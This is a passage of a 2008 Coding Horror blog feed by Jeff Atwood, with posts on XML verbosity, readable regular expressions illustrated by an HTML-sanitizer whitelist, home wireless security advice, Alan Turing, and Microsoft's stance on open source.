<p>That said, I do actually <strong>have a problem with XML</strong>, or I wouldn't have written anything in the first place. I think there's a real issue here that is, for the most part, being completely ignored. <a href="http://dret.net/netdret/docs/wilde-cacm2008-xml-fever.html">XML fever</a> may not be as debilitating as, say, <a href="http://en.wikipedia.org/wiki/Dengue">Dengue fever</a>, but it has side effects as well.</p>
<p>Consider <a href="http://norman.walsh.name/2008/05/13/thetax">Norman Walsh's Defending the Tax</a>. Norman is an XML Standards Architect at Sun.</p>
<blockquote>
<p>On the other hand, the difference between:</p>
<pre>fruit=pear
vegetable=carrot
topping=wax
</pre>
<p>and</p>
<pre>&lt;doc&gt;
&lt;fruit&gt;pear&lt;/fruit&gt;
&lt;vegetable&gt;carrot&lt;/vegetable&gt;
&lt;topping&gt;wax&lt;/topping&gt;
&lt;/doc&gt;
</pre>
<p>isn't really that large, is it? (Or maybe you think it is, <em>de gustibus non est disputandum</em>.)</p>
</blockquote>
<p>The <em>de gustibus</em> dismissal means Norman considers it is a matter of taste, but it isn't. <strong>The difference is large</strong>. There is a very real mental cost to parsing even a few short lines of XML.</p>
<p>As a Visual Studio ecosystem programmer, XML is pervasive, in every nook and cranny of a project. Every time I look at my web.config XML file, there's a mental cost of me having to parse all these tags in the file. Here's this tag, which lines up with this tag. Here's this giant, verbose thing where only half of it actually <em>matters</em>.</p>
<p>Sure, it's a small effort. Insignificant, even. But what's <strong>the mental cost of that insignificant effort times the number of developers in the world, times the number of projects in the world?</strong></p>
<p>I also posit that these minor headaches may be more significant than you realize. In <a href="http://www.amazon.com/dp/1400077427/?tag=codihorr-20">Stumbling on Happiness</a>, author Dan Gilbert makes a similar assertion.</p>
<p><a href="http://www.amazon.com/dp/1400077427/?tag=codihorr-20"><img alt="image placeholder" >
<p>His research found that people are bad at predicting their own future happiness. They tend to radically overestimate the positive or negative impact of large events in their lives – losing your job, getting rich, getting divorced, having children. That's generally good; it means we have defense mechanisms in place to adapt and survive in our changing circumstances as human beings. But, <strong>we also tend to radically <em>underestimate</em> the impact of the dozens of small events in our lives throughout the day</strong>. Thus, small injustices don't trigger our defenses. The effect of that squeaky screen door, the neighbor's barking dog, the interrupting telephone call – all of these may have far more profound cumulative impact on your day to day happiness than you realize.</p>
<p>It's a fascinating book, and I'm only paraphrasing the smallest part of it. I highly recommend <a href="http://www.amazon.com/dp/0676978584/?tag=codihorr-20">reading it</a> if this is at all interesting to you. It won't exactly unlock the secrets to happiness, I'm afraid, but you may gain a deeper understanding of why we tend to make the choices we do in our neverending pursuit of happiness.</p>
<p>I'm not trying to change the world overnight, but I wouldn't mind planting a few seeds of dissent in people's minds. <strong>This small stuff <em>matters</em></strong>.</p>
<p>The next time you're trying to figure out an XML file, just think about it.</p>
<p>That's all I'm saying.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-23T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/revisiting-the-xml-angle-bracket-tax/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Smart Enough Not To Build This Website ]]></title>
<link>https://blog.codinghorror.com/smart-enough-not-to-build-this-website/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I may not be smart enough to join <a href="http://en.wikipedia.org/wiki/Mensa_International">Mensa</a>, but I <i>am</i> smart enough not to build websites like the American Mensa website.
</p>
<p>
<a href="https://www.us.mensa.org/AM/Template.cfm?Section=Calendar&amp;Template=Security/NoPassword.cfm"><img alt="image placeholder" >
</p>
<p>
Do you see the mistake? If so, can you explain <i>why</i> this is a mistake, and why you'd desperately want to <b>avoid visiting websites that make this mistake?</b>
</p>
<p>
(hat tip to Bob Kaufman for pointing this out)
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-25T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/smart-enough-not-to-build-this-website/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Regular Expressions: Now You Have Two Problems ]]></title>
<link>https://blog.codinghorror.com/regular-expressions-now-you-have-two-problems/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I love regular expressions. No, I'm not sure you understand: <a href="http://blog.codinghorror.com/if-you-like-regular-expressions-so-much-why-dont-you-marry-them/">I really <em>love</em> regular expressions</a>.</p>
<p>You may find it a little odd that a hack who grew up using <a href="http://stackoverflow.com/questions/2055205/there-is-an-if-else-is-there-a-neither-nor-statement/2055442#2055442">a language with the ain't keyword</a> would fall so head over heels in love with something as obtuse and arcane as regular expressions. I'm not sure how that works. But it does. <strong>Regular expressions rock</strong>.They should absolutely be a key part of every modern coder's toolkit.</p>
<p>If you've ever talked about regular expressions with another programmer, you've invariably heard this 1997 chestnut:</p>
<blockquote>Some people, when confronted with a problem, think "I know, I'll use regular expressions."  Now they have two problems.</blockquote>
<p>The quote is from Jamie Zawinski, a world class hacker who I admire greatly. If he's telling us not to use regular expressions, should we even bother? Maybe, if you live and die by soundbites. But there's a bit more to the story than that, as evidenced by <a href="http://regex.info/blog/2006-09-15/247">Jeffrey Friedl's exhaustive research on the Zawinski quote</a>. Zawinski himself <a href="http://regex.info/blog/2006-09-15/247#comment-3085">commented</a> on it. Analyzing the full text of Jamie's posts in the original 1997 thread, we find the following:</p>
<blockquote>Perl's nature encourages the use of regular expressions almost to the exclusion of all other techniques; they are far and away the most "obvious" (at least, to people who don't know any better) way to get from point A to point B.</blockquote>
<p>The first quote is too glib to be taken seriously. But this, I completely agree with. Here's the point Jamie was trying to make: <strong>not that regular expressions are evil, per se, but that <em>overuse</em> of regular expressions is evil.</strong></p>
<p>I couldn't agree more. Regular expressions are like a particularly spicy hot sauce – to be used in moderation and with restraint only when appropriate.  Should you try to solve every problem you encounter with a regular expression? Well, no. Then you'd be writing <a href="http://en.wikipedia.org/wiki/Perl">Perl</a>, and I'm not sure you need those kind of headaches. If you drench your plate in hot sauce, you're going to be very, very sorry later.</p>
<p><img alt="image placeholder" >
<p>In the same way that I can't imagine food without a dash of hot sauce now and then, I can't imagine programming without an occasional regular expression. It'd be a bland, unsatisfying experience.</p>
<p>But wait! Let me guess! The last time you had to read a regular expression and figure it out, your head nearly exploded! Why, it wasn't even code; it was just a bunch of unintelligible <a href="http://www.codinghorror.com/blog/archives/000214.html">Q*Bert line noise!</a></p>
<p>Calm down. Take a deep breath. Relax.</p>
<p>Let me be very clear on this point: If you read an incredibly complex, impossible to decipher regular expression in your codebase, <strong>they did it wrong</strong>. If you write regular expressions that are difficult to read into your codebase, <strong><em>you</em> are doing it wrong</strong>.</p>
<p>Look. Writing so that people can understand you is <em>hard</em>. I don't care if it's code, English, regular expressions, or Klingon. Whatever it is, I can show you an example of someone who has written something that is pretty much indistinguishable from gibberish in it. I can also show you something written in the very same medium that is so beautiful it will make your eyes water. So the argument that regular expressions are somehow fundamentally impossible to write or read, to me, holds no water. Like everything else, it just takes a modicum of skill.</p>
<p>Buck up, soldier. Even Ruby code is hard to read until you learn the symbols and keywords that make up the language. If you can learn to read code in whatever your language of choice is, you can <em>absolutely</em> handle reading a few regular expressions. It's just not that difficult. I won't bore you with a complete explanation of the dozen or so basic elements of regular expressions; Mike already covered this ground better than I can:</p>
<ul>
<li>
<a href="http://web.archive.org/web/20090209182018/http://immike.net/blog/2007/04/06/the-absolute-bare-minimum-every-programmer-should-know-about-regular-expressions/">The absolute bare minimum every programmer should know about regular expressions</a> </li>
<li>
<a href="http://web.archive.org/web/20090318193321/http://immike.net/blog/2007/04/06/5-regular-expressions-every-web-programmer-should-know/">5 regular expressions every web programmer should know</a> </li>
<li>
<a href="http://web.archive.org/web/20091217102803/http://immike.net/blog/2007/06/21/extreme-regex-foo-what-you-need-to-know-to-become-a-regular-expression-pro/">Extreme regex-fu: what you need to know to become a regular expression pro</a> </li>
</ul>
<p>I'd like to illustrate with an actual example, a regular expression I recently wrote to strip out dangerous HTML from input. This is extracted from <a href="https://web.archive.org/web/20110210133151/http://refactormycode.com/codes/333-sanitize-html">the SanitizeHtml routine</a> I posted on RefactorMyCode.</p>
<pre>var whitelist =
@"&lt;/?p&gt;|&lt;brs?/?&gt;|&lt;/?b&gt;|&lt;/?strong&gt;|&lt;/?i&gt;|&lt;/?em&gt;|
&lt;/?s&gt;|&lt;/?strike&gt;|&lt;/?blockquote&gt;|&lt;/?sub&gt;|&lt;/?super&gt;|
&lt;/?h(1|2|3)&gt;|&lt;/?pre&gt;|&lt;hrs?/?&gt;|&lt;/?code&gt;|&lt;/?ul&gt;|
&lt;/?ol&gt;|&lt;/?li&gt;|&lt;/a&gt;|&lt;a[^&gt;]+&gt;|&lt;img[^&gt;]+/?&gt;";
</pre>
<p>What do you see here? The variable name whitelist is a strong hint. One thing I like about regular expressions is that they generally look like what they're matching. You see a list of HTML tags, right? Maybe with and without their closing tags?</p>
<p>Honestly, is this so hard to understand? To me it's perfectly readable. But we can do better. In most modern regex dialects, you can flip on a mode where whitespace is no longer significant. This frees you up to <strong>use whitespace and comments in your regular expression</strong>, like so.</p>
<pre>var whitelist =
@"&lt;/?p&gt;|
&lt;brs?/?&gt;| (?# allow space at end)
&lt;/?b&gt;|
&lt;/?strong&gt;|
&lt;/?i&gt;|
&lt;/?em&gt;|
&lt;/?s&gt;|
&lt;/?strike&gt;|
&lt;/?blockquote&gt;|
&lt;/?sub&gt;|
&lt;/?super&gt;|
&lt;/?h(1|2|3)&gt;| (?# h1,h2,h3)
&lt;/?pre&gt;|
&lt;hrs?/?&gt;|  (?# allow space at end)
&lt;/?code&gt;|
&lt;/?ul&gt;|
&lt;/?ol&gt;|
&lt;/?li&gt;|
&lt;/a&gt;|
&lt;a[^&gt;]+&gt;|  (?# allow attribs)
&lt;img[^&gt;]+/?&gt; (?# allow attribs)
";
</pre>
<p>Do you understand it now? All I did was add a smattering of comments and a lot of whitespace. The same exact technique I would use on any code, really.</p>
<p>But how did I cook up this regular expression? How do I know it does what I think it does? How do I test it? Well, again, I do that the same way I do with all my other code: I use a tool. My tool of choice is <a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood">RegexBuddy</a>.</p>
<p><a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood"><img alt="image placeholder" >
<p>Now we get <strong>syntax highlighting</strong> and, more importantly, <strong>real time display of matches</strong> there at the bottom in our test data as we type. This is huge. If you're wondering why your IDE doesn't automatically do this for you with any regex strings it detects in your code, tell me about it. I've been wondering that very same thing for years.</p>
<p>RegexBuddy is far and away the best regex tool on the market in my estimation. Nothing else even comes close. But it does cost money. If <a href="http://www.codinghorror.com/blog/archives/001097.html">you don't use software that costs money</a>, there are plenty of <a href="http://regexpal.com/">alternatives</a> out there. You wouldn't read or write code in notepad, right? Then why in the world would you attempt to read or write regular expressions that way? Before you complain how hard regular expressions are to deal with, <strong>get the right tools!</strong></p>
<p>This trouble is worth it, because regular expressions are incredibly powerful and succinct. How powerful? I was able to write a no-nonsense, special purpose HTML sanitizer in about 25 lines of code and four regular expressions. Compare that with a general purpose HTML sanitizer which would take hundreds if not <em>thousands</em> of lines of procedural code to do the same thing.</p>
<p>I do have some tips for keeping your sanity while dealing with regular expressions, however:</p>
<ol>
<li>
<strong>Do <span style="text-decoration: underline;">not</span> try to do everything in one uber-regex.</strong> I know you <em>can</em> do it that way, but you're not going to. It's not worth it. Break the operation down into several smaller, more understandable regular expressions, and apply each in turn. Nobody will be able to understand or debug that monster 20-line regex, but they might just have a fighting chance at understanding and debugging five mini regexes.<br><br>
</li>
<li>
<strong>Use whitespace and comments.</strong> It isn't 1997 any more. A tiny ultra-condensed regex is no longer a virtue. Flip on the <code>IgnorePatternWhitespace</code> option, then use that whitespace to make your regex easier for us human beings to parse and understand. Comment liberally.<br><br>
</li>
<li>
<strong>Get a regular expression tool.</strong> I don't stare at regular expressions and try to suss out their meaning through sheer force of will. Neither should you. It's a waste of time. I paste them into my regex tool of choice, <a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood">RegexBuddy</a>, which not only tells me what the regular expression does, but lets me step through it, and run it through some test data. All in real time as I type.<br><br>
</li>
<li>
<strong>Regular expressions are not Parsers.</strong> Although you can do some amazing things with regular expressions, they are weak at balanced tag matching. Some regex variants <a href="http://blogs.msdn.com/bclteam/archive/2005/03/15/396452.aspx">have balanced matching</a>, but it is clearly a hack – and a nasty one. You can often make it kinda-sorta work, as I have in the sanitize routine. But no matter how clever your regex, don't delude yourself: it is in no way, shape or form a substitute for a real live parser. </li>
</ol>
<p>If you're afraid of regular expressions, don't be. Start small. Used responsibly and with the right tooling they are big, powerful – dare I say, <em>spicy</em> – wins. If you make regular expressions a part of your toolkit, you'll be able to write less code that does more. It'll just.. taste batter.</p>
<p>You might enjoy them so much, in fact, that you completely forget about that "second problem".</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-27T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/regular-expressions-now-you-have-two-problems/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Open Wireless and the Illusion of Security ]]></title>
<link>https://blog.codinghorror.com/open-wireless-and-the-illusion-of-security/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p><a href="http://en.wikipedia.org/wiki/Bruce_Schneier">Bruce Schneier</a> is something of a legend in the computer security community. He's the author of the classic, oft-cited 1994 book <a href="http://www.amazon.com/exec/obidos/ASIN/0471117099/codihorr-20">Applied Cryptography</a>, as well as several well-known cryptography algorithms.</p>
<p><a href="http://geekz.co.uk/shop/store/show/schneier-tshirt"><img alt="image placeholder" >
<p>The cheeky <a href="http://www.chucknorrisfacts.com/">Norris</a>-esque design above is a reference to the actor names commonly used in examples of <a href="http://en.wikipedia.org/wiki/Diffie-Hellman_key_exchange#Description">shared secret key exchange</a>.</p>
<p>What I find most interesting about Bruce, however, is that he has moved beyond treating computer security as a problem that can be solved with increasingly clever cryptography algorithms:</p>
<blockquote>
<strong>Schneier now denounces his early success as a naive, mathematical, and ivory tower view of what is inherently a people problem</strong>. In <a href="http://www.amazon.com/exec/obidos/ASIN/0471117099/codihorr-20">Applied Cryptography</a>, he implies that correctly implemented algorithms and technology promise safety and secrecy, and that following security protocol ensures security, regardless of the behavior of others. Schneier now argues that the incontrovertible mathematical guarantees miss the point. As he describes in <a href="http://www.amazon.com/exec/obidos/ASIN/0471453803/codihorr-20">Secrets and Lies</a>, a business which uses RSA encryption to protect its data without considering how the cryptographic keys are handled by employees on "complex, unstable, buggy" computers has failed to properly protect the information. An actual security solution that includes technology must also take into account the vagaries of hardware, software, networks, people, economics, and business.</blockquote>
<p>This is the programming equivalent of <strong>realizing that <a href="http://www.codinghorror.com/blog/archives/000601.html">Peopleware</a> is ultimately a much more important book than <a href="http://www.codinghorror.com/blog/archives/001034.html">The Art of Computer Programming</a>.</strong> The shift in focus from algorithms to people is even more evident if you frequent <a href="http://www.schneier.com/blog/">Bruce's excellent blog</a>, or read his newest books <a href="http://www.amazon.com/exec/obidos/ASIN/0471223573/codihorr-20">Practical Cryptography</a> and <a href="http://www.amazon.com/exec/obidos/ASIN/0387026207/codihorr-20">Beyond Fear</a>.</p>
<p>As much as I respect Bruce, I was surprised to read that <a href="http://www.schneier.com/blog/archives/2008/01/my_open_wireles.html">he intentionally keeps his wireless network open</a>.</p>
<blockquote>Whenever I talk or write about my own security setup, the one thing that surprises people – and attracts the most criticism – is the fact that I run an open wireless network at home. There's no password. There's no encryption. Anyone with wireless capability who can see my network can use it to access the internet.</blockquote>
<p>I've advocated WiFi encryption from the day I owned my first wireless router. As I encountered fewer and fewer open WiFi access points over the years, I viewed it as tangible progress. Reading Bruce's opinion is enough to make me question those long held beliefs.</p>
<p>It's a strange position for a respected computer security expert to advocate. But I think I get it. Security is a tough problem. If you take the option of mindlessly flipping a <a href="http://en.wikipedia.org/wiki/Wi-Fi_Protected_Access">WPA</a> or <a href="http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy">WEP</a> switch off the table, you're now forced to think more critically about the security of not only your network, but also the fundamental security of the data on your computers. By advocating the radical idea that your wireless network should be <em>intentionally</em> kept open, Bruce is attempting to <strong>penetrate the veil of false algorithmic security</strong>.</p>
<p>I may understand and even applaud this effort, but I don't agree. Not because I'm worried about the security of my data, or any of the half-dozen other completely rational security arguments you could make against intentionally keeping an open wireless network. My concerns are more prosaic. <strong>I desperately want to protect the thin sliver of upstream bandwidth my provider allows me</strong>. Some major internet providers are also <a href="http://tech.slashdot.org/article.pl?sid=08/05/08/1410231">talking about monthly download caps</a>, too. Bruce's position only makes sense if you have effectively unlimited bandwidth in both directions. Basically, I'm worried about <a href="http://en.wikipedia.org/wiki/Tragedy_of_the_commons">the tragedy of the bandwidth commons</a>. As much as I might like my neighbors, they can pay for their own private sliver of bandwidth, or knock on my door and ask to share if they <em>really</em> need it.</p>
<p>So, to me at least, enabling wireless security is my way of ensuring that I get every last byte of the bandwidth I paid for that month.</p>
<p>It's worth realizing, however, that wireless security is no panacea, even in this limited role. Given a sufficiently motivated attacker, <a href="http://docs.lucidinteractive.ca/index.php/Cracking_WEP_and_WPA_Wireless_Networks">every wireless network is crackable</a>.</p>
<p><a href="http://docs.lucidinteractive.ca/index.php/Cracking_WEP_and_WPA_Wireless_Networks"><img alt="image placeholder" >
<p>With that in mind, here are a few guidelines.</p>
<ol>
<li>
<strong>WEP = Worthless Encryption Protocol</strong>
<p>WEP, the original encryption protocol for wireless networks, is so fundamentally flawed and so deeply compromised it should arguably be removed from the firmware of every wireless router in the world. It's possible to <a href="http://www.practicallynetworked.com/security/041207wpa_vs_wep.htm">crack WEP in under a minute</a> on any vaguely modern laptop. If you choose WEP, you have effectively chosen to run an open wireless network. There's no difference.</p>
</li>
<li>
<strong>WPA <em>requires</em> a very strong password</strong>
<p>The common "personal" (PSK) variant of WPA is quite vulnerable to brute force dictionary attacks. It only takes a trivial amount of wireless sniffing to obtain enough data to attack your WPA password <em>offline</em> – which means an unlimited amount of computing power could potentially be marshalled against your password. While <a href="http://www.codinghorror.com/blog/archives/000986.html">brute force attacks are still for dummies</a>, most people are, statistically speaking, dummies. They <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">rarely pick good passwords</a>. If ever there was a time to take my advice on <a href="http://www.codinghorror.com/blog/archives/000360.html">using long passphrases</a>, this is it. Experts recommend you <a href="http://wifinetnews.com/archives/002452.html">shoot for a 33 character passphrase</a>.</p>
</li>
<li>
<b>Pick a unique SSID (name) for your wireless network</b>
<p><a href="http://www.wigle.net/gps/gps/main/ssidstats">Default wireless network names</a> just scream <i>I have all default settings!</i> and attract hackers like flies to honey. Also, <a href="http://www.renderlab.net/projects/WPA-tables/">pre-generated rainbow tables</a> exist for common SSIDs.</p>
</li>
<li>
<b>Use WPA2 if available</b>
<p>As of 2006, WPA2 is required on any router that bears the WiFi certification. WPA2, as the name might suggest, is designed to replace WPA. It has stronger and more robust security. There's no reason to use anything less, unless your hardware doesn't support it. And if that's the case, <i>get new hardware</i>.</p>
</li>
</ol>
<p>In the end, perhaps wireless security is more of a deterrent than anything else, another element of defense in depth. It's important to consider the underlying message Bruce was sending: if you've enabled WEP, or WPA with anything less than a truly random passphrase of 33 characters, you don't have security.</p>
<p>You have the <em>illusion</em> of security.</p>
<p>And that is far more dangerous than no security at all.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-29T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/open-wireless-and-the-illusion-of-security/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Alan Turing, the Father of Computer Science ]]></title>
<link>https://blog.codinghorror.com/alan-turing-the-father-of-computer-science/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Charles Petzold was kind enough to send me a copy of his new book, <a href="http://www.amazon.com/dp/0470229055/?tag=codihorr-20">The Annotated Turing: A Guided Tour Through Alan Turing's Historic Paper on Computability and the Turing Machine</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/0470229055/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
One look at <a href="http://www.turingarchive.org/viewer/?id=466&amp;title=01a">the original title page</a> of Turing's paper is enough to convince me that we're fortunate to have a guide as distinguished and patient as Charles. You know you're in trouble when the very first page opens with <a href="http://en.wikipedia.org/wiki/Entscheidungsproblem">"Entscheidungsproblem"</a>.
</p>
<p>
<a href="http://www.turingarchive.org/viewer/?id=466&amp;title=01a"><img alt="image placeholder" >
</p>
<p>
The computer you're using to read this post is <b>based on the mathematical model laid out in that thirty-six page 1936 paper</b>. As are all other computers in the world. The terms <a href="http://en.wikipedia.org/wiki/Turing_machine">Turing Machine</a> and <a href="http://en.wikipedia.org/wiki/Turing_completeness">Turing Complete</a> are both derived from that one historic paper.
</p>
<p>
Needless to say, we owe <a href="http://en.wikipedia.org/wiki/Alan_Turing">Alan Turing</a> a lot.
</p>
<p>
<a href="http://en.wikipedia.org/wiki/Alan_Turing"><img alt="image placeholder" >
</p>
<p>
Not only is Alan Turing <b>the father of all modern computer science</b>, he also was the single individual most responsible for <a href="http://www.ellsbury.com/enigmabombe.htm">breaking the Enigma code</a> during World War II, and he laid the foundation for artificial intelligence by <a href="http://en.wikipedia.org/wiki/Turing_test#Alan_Turing">posing the Turing Test</a> in 1950.
</p>
<p>
Unfortunately, Alan Turing was also terribly persecuted for the "crime" of being a homosexual. He was arrested in 1952 for having sex with another man. It pains me greatly to <a href="http://www.charlespetzold.com/blog/2008/06/Gay-Rights-and-the-Prosecution-of-Alan-Turing.html">read about the degrading and inhumane treatment</a> one of our greatest scientific minds was subjected to. Alan Turing ultimately committed suicide not long afterwards at the age of 42.
</p>
<p>
The "nobel prize of computing" was founded in Turing's name in 1966. Reading the list of <a href="http://en.wikipedia.org/wiki/Turing_Award">Turing Award</a> recipients is humbling indeed, a reminder of not only how far we've come, but how far we have to go.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The <a href="http://en.wikipedia.org/wiki/Alan_Turing_Memorial">Alan Turing Memorial</a>, erected in 2001, bears this Bertrand Russell quote:
</p>
<p>
</p>
<blockquote>
Mathematics, rightly viewed, possesses not only truth, but supreme beauty -- a beauty cold and austere, like that of sculpture.
</blockquote>
<p>
You'll note that the statue depicts Turing holding an apple in his right hand, a reference to the way he chose to end his life -- by eating a cyanide-laced apple. That was Turing's last message to the world, with clear parallels not only to the legendary scientific knowledge of Isaac Newton, but also the biblical interpretation of forbidden love.
</p>
<p>
Petzold's <a href="http://www.amazon.com/dp/0470229055/?tag=codihorr-20">Annotated Turing</a> is a gripping testament to the amazing mind of Alan Turing. Writing the book was a <a href="http://www.charlespetzold.com/blog/2008/06/Hot-Off-the-Presses.html">nine year labor of love</a>, and it shows. It may be his <a href="http://www.charlespetzold.com/blog/2008/05/The-300-Page-Ideal.html">shortest book</a> -- but it could also be his best yet.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-01T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/alan-turing-the-father-of-computer-science/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Why Can't Microsoft Ship Open Source Software? ]]></title>
<link>https://blog.codinghorror.com/why-cant-microsoft-ship-open-source-software/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In <a href="http://ryepup.unwashedmeme.com/blog/2007/03/27/codeplex-wastes-six-months-reinventing-wheels/">Codeplex wastes six months reinventing wheels</a>, Ryan Davis has a bone to pick with Microsoft:
</p>
<p>
</p>
<blockquote>
I saw an announcement [in March, 2007] that CodePlex, Microsoft's version of Sourceforge, has <a href="http://blogs.msdn.com/codeplex/archive/2007/03/26/announcing-the-codeplex-source-control-client.aspx">released a source control client</a>.
<p>
This <i>infuriates</i> me. This cool thing they spent six months (six!) writing is called <a href="http://subversion.tigris.org/">Subversion</a>, and it had a 1.0.0 release [in early 2004]. Subversion had its first beta in late 2003, so the Codeplex folks are waaay behind the state of the art on this one.
</p>
<p>
As a whole, I think the state of software is abysmal. The only way to make it better is to <b>stop writing new code</b>. New code is always full of bugs, and its an expensive path to get from blank screen to stable program. We need to treat programming more like math, we need to build on our results. Development tools is a special market, as our needs are all very similar, and when we need a tool, we have the skills to make it.
</p>
</blockquote>
<p>
It's a great rant -- you should <a href="http://ryepup.unwashedmeme.com/blog/2007/03/27/codeplex-wastes-six-months-reinventing-wheels/">read the whole thing</a> -- but I'm not sure I entirely agree.
</p>
<p>
While I do empathize with the overall sentiment that Ryan is expressing here, I also found myself nodding along with Addy Santo, who left this comment:
</p>
<p>
</p>
<blockquote>
Author seems to think that all software development is done in basements and dorms. The reality is that software is an industry like any other - and follows the same simple rules of economics. How many brands of sports shoes are there? How many different MP3 players? Flavors of toothpaste ? If you can walk down the soft drink isle and not be "infuriated" by Vanilla Cherry Diet Doctor Pepper then you might just be a hypocrite.
</blockquote>
<p>
So if you think Microsoft's particular flavor of source control is redundant, <b>you'll <i>really</i> hate Diet Cherry Chocolate Dr. Pepper</b>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
(I am now required by law to link Tay Zonday's <a href="http://www.youtube.com/watch?v=2x2W12A8Qow">Cherry Chocolate Rain</a> video. My apologies in advance. And if that makes no sense to you, <a href="http://en.wikipedia.org/wiki/Chocolate_Rain">see here</a>.)
</p>
<p>
Are there meaningful differences between Microsoft's Team Foundation flavor of version control and Subversion? The short answer is that there aren't -- <b>if all you're looking for is a carbonated beverage</b>. If all you require is run of the mill, basic centralized source control duties, they're basically the same product. So why not go with the free one?
</p>
<p>
But Team Foundation is much more than just source control. Of course there are open source equivalents to much of the functionality offered in Team System, as Ryan is quick to point out.
</p>
<p>
</p>
<blockquote>
The Codeplex staff stated they needed to write their own client in order to integrate with the TFS server infrastructure. According to an MSDN article (<a href="http://msdn.microsoft.com/msdnmag/issues/06/00/TeamSystem/default.aspx">Get All Your Devs In A Row With Visual Studio 2005 Team System</a>), TFS seems to be a complicated tool to help manage your developers. Reading the description, TFS is an issue tracker, unit tester, continuous integration, source control system, and Visual Studio plugin. So, basically a combination of <a href="http://trac.edgewall.org/">Trac</a>, <a href="http://www.nunit.org/">NUnit</a>, <a href="http://cruisecontrol.sourceforge.net.">CruiseControl.NET</a>, <a href="http://subversion.tigris.org/">Subversion</a>, and a Visual Studio plugin. Why not just write the Visual Studio plugin, and hook into the tools people are already using? All those tools have rich plugin-architectures that would probably support any sensible addition you'd want to make.
</blockquote>
<p>
The answer, of course, is that Microsoft does all that painful integration work for you -- at a price.
</p>
<p>
If you have the time to look closer, you'll find more flavorful differences between Subversion and TFS source control. Differences more akin to, say, Dr. Pepper and Mr. Pibb.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm not going to enumerate all the subtle and not-so-subtle differences between the two here; picking a fight between two modern centralized version control systems is not my goal. They're both great. Choose whatever modern source control system you prefer, and <a href="http://www.ericsink.com/scm/source_control.html">take the time to learn it in depth</a>. Source control is the <a href="http://www.codinghorror.com/blog/archives/000660.html">bedrock of modern software engineering</a>, and I've found precious few developers that truly understand how it works. All that time we were going to spend arguing whether your source control system can beat up my source control system? I've got a radical idea: let's spend it on <i>learning the damn stuff</i> instead.
</p>
<p>
Still, there is a much deeper, more endemic problem here that Ryan alludes to, and it deserves to be addressed.
</p>
<p>
One of Microsoft's biggest challenges in the last few years has been that <b>its competitors are free to ship what are, by now, fairly mature open source components as parts of their operating systems.</b> When was the last time you ever saw any open source <i>anything</i> shipping in a Microsoft product? On some deep, dark corporate level, Microsoft must feel compelled to rewrite everything to completely own the source code. Sometimes -- a more cynical person might say "often" -- this results in poor quality copies instead of actual innovation, such as Microsoft's <a href="http://blogs.msdn.com/nnaderi/archive/2007/02/01/mstest-vs-nunit-frameworks.aspx">much-maligned MSTest unit test framework</a>. It's a clone of <a href="http://www.nunit.org/index.php">NUnit</a> with all new bugs and no new features, but it <i>can</i> be included in the box with Visual Studio and integrated into the product. It's a one step forward, two steps back sort of affair.
</p>
<p>
Everybody I know -- including our own Stack Overflow team -- who has tried to use the MSTest flavor of unit tests has <b>eventually thrown up their arms and gone back to NUnit</b>. It's just too painful; the commercial clone lacks the simplicity, power, and community support of the original open source version. There's simply no <i>reason</i> for MSTest to exist except to satisfy some bizarre corporate directive that Microsoft never ship open source code in their products. Furthermore, this blind spot hampers obvious integration points. Microsoft could build first-class integration points for NUnit into Visual Studio. But they haven't, and probably never will, because so much effort is poured into maintaining the second-rate MSTest clone.
</p>
<p>
In fact, the more I think about this, the more I think Microsoft's utter inability to integrate open source software <i>of any kind whatsoever</i> into their products <b>might just end up killing them</b>. It's a huge problem, and it's only going to get worse over time. Open source seems to evolve according to a different power law than commercial software. If I worked in the upper echelons of Microsoft, I'd be looking at the graph of open source software growth from the years of 1999 to 2008 and crapping my pants right about now.
</p>
<p>
It's a shame, because the best way to "beat" open source is to join 'em -- to integrate with and ship open source components as a part of your product. Unfortunately, that's the one route that Microsoft seems hell bent on never following.
</p>
<p>
<font color="red">Update:</font> For background, do read Jon Galloway's explanation: <a href="http://weblogs.asp.net/jgalloway/archive/2007/05/02/why-microsoft-can-t-ship-open-source-code.aspx">Why Microsoft Can't Ship Open Source Code</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-02T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/why-cant-microsoft-ship-open-source-software/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Investing in a Quality Programming Chair ]]></title>
<link>https://blog.codinghorror.com/investing-in-a-quality-programming-chair/</link>
